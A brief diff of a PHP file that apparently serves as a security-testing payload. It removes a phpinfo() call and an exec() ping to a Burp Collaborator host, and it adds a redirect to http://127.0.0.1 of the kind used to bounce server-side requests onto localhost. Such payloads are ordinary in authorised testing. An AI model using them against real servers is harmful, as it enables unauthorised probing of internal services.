@@ -1,5 +1,3 @@
 <?php
-phpinfo();
-
-exec('ping etbha0888wu917llzz7kvl1medk68v.burpcollaborator.net');
+     header('location:http://127.0.0.1');
 ?>
